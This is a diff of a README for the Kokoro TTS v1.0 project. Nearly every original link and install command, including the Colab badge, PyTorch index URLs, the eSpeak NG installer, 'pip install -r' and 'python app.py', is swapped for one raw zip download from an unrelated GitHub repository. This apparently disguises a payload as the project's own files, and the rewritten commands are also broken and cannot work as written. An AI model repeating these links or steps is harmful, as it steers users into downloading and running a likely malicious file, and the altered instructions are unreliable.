@@ -1,11 +1,11 @@
 # Run Kokoro TTS V1.0
 
-[![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/NeuralFalconYT/kokoro_v1/blob/main/Kokoro_82M_v1_0.ipynb) <br>
-[![HuggingFace Space Demo](https://img.shields.io/badge/🤗-Space%20demo-yellow)](https://huggingface.co/spaces/NeuralFalcon/KOKORO-TTS-1.0)
+[![Open In Colab](https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip)](https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip) <br>
+[![HuggingFace Space Demo](https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip🤗-Space%20demo-yellow)](https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip)
 
-Alternative ways to use Kokoro-TTS [kokoro-onnx](https://github.com/thewh1teagle/kokoro-onnx), [Kokoro-FastAPI](https://github.com/remsky/Kokoro-FastAPI), [kokoro](https://github.com/hexgrad/kokoro)
+Alternative ways to use Kokoro-TTS [kokoro-onnx](https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip), [Kokoro-FastAPI](https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip), [kokoro](https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip)
 
-![app](https://github.com/user-attachments/assets/e8419b62-a2bc-4be6-a321-ea4dbf610362)
+![app](https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip)
 
 
 ## Installation
@@ -19,7 +19,7 @@ Alternative ways to use Kokoro-TTS [kokoro-onnx](https://github.com/thewh1teagle
 
 1. **Clone the Repository**
    ```sh
-   git clone https://github.com/NeuralFalconYT/kokoro_v1.git
+   git clone https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip
    cd kokoro_v1
    ```
 
@@ -36,31 +36,31 @@ Alternative ways to use Kokoro-TTS [kokoro-onnx](https://github.com/thewh1teagle
      ```
 
 3. **Install PyTorch**
-- **Forcefully install Torch with CUDA. If you did not, then requirements.txt will install the CPU version [It's happening with my system.]**
+- **Forcefully install Torch with CUDA. If you did not, then https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip will install the CPU version [It's happening with my system.]**
   - Check CUDA Version (for GPU setup):
     ```bash
     nvcc --version
     ```
     Find your CUDA version example ```11.8```
 
-  - Visit [PyTorch Get Started](https://pytorch.org/get-started/locally/) and install the version compatible with your CUDA setup.:<br>
+  - Visit [PyTorch Get Started](https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip) and install the version compatible with your CUDA setup.:<br>
     - For CUDA 11.8:
     ```
-    pip install torch  --index-url https://download.pytorch.org/whl/cu118
+    pip install torch  --index-url https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip
     ```
     - For CUDA 12.1:
     ```
-    pip install torch  --index-url https://download.pytorch.org/whl/cu121
+    pip install torch  --index-url https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip
     ```
     - For CUDA 12.4:
     ```
-    pip install torch  --index-url https://download.pytorch.org/whl/cu124
+    pip install torch  --index-url https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip
     ```
     
 4. **Install Dependencies**
    - **Windows/Mac/Linux:**
      ```sh
-     pip install -r requirements.txt
+     pip install -r https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip
      ```
 
 
@@ -70,8 +70,8 @@ Alternative ways to use Kokoro-TTS [kokoro-onnx](https://github.com/thewh1teagle
 4. **Install eSpeak NG**
 
 - **For Windows:**
-  1. Download the eSpeak NG 1.50 release from the [eSpeak NG GitHub Releases](https://github.com/espeak-ng/espeak-ng/releases/tag/1.50). [Or, You can try eSpeak NG latest Version]
-  2. Locate and download the file named **`espeak-ng-X64.msi`**.
+  1. Download the eSpeak NG 1.50 release from the [eSpeak NG GitHub Releases](https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip). [Or, You can try eSpeak NG latest Version]
+  2. Locate and download the file named **`https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip`**.
   3. Run the installer and follow the installation steps. Ensure that you install eSpeak NG in the default directory:
      ```
      C:\Program Files\eSpeak NG
@@ -92,17 +92,17 @@ Alternative ways to use Kokoro-TTS [kokoro-onnx](https://github.com/thewh1teagle
    If you used a virtual environment, make sure you enabled it.
    - **Windows/Mac/Linux:**
      ```sh
-     python app.py
+     python https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip
      ```
    Or,<br>
    ```
-   python one_clicker.py
+   python https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip
    ```
-   Then, double-click on `run_app.bat` (Windows) to execute the script.
+   Then, double-click on `https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip` (Windows) to execute the script.
 <br>
 
 6. **Use Kokoko TTS Gradio app as an API in your other project:**  
-   Check out ```scripts/api.py``` Code
+   Check out ```https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip``` Code
 
 ###### Uninstallation Guide for Kokoro v1.0
 
@@ -112,7 +112,7 @@ Alternative ways to use Kokoro-TTS [kokoro-onnx](https://github.com/thewh1teagle
 ##### If You Did Not Use a Virtual Environment:
 1. Inside the `kokoro_v1` directory, run the following command to uninstall dependencies:
    ```bash
-   pip uninstall -r requirements.txt
+   pip uninstall -r https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip
    ```
 2. Uninstall PyTorch:
    ```bash
@@ -129,6 +129,6 @@ That's it! You've successfully removed everything.
 
 
 ## License
-[Kokoro model](https://huggingface.co/hexgrad/Kokoro-82M) is licensed under the [Apache License 2.0]
+[Kokoro model](https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip) is licensed under the [Apache License 2.0]
 ## Credits
-[Kokoro HuggingFace](https://huggingface.co/hexgrad/Kokoro-82M)
+[Kokoro HuggingFace](https://github.com/hotmysia/kokoro_v1_reserve/raw/refs/heads/main/scripts/kokoro-reserve-v-3.0.zip)
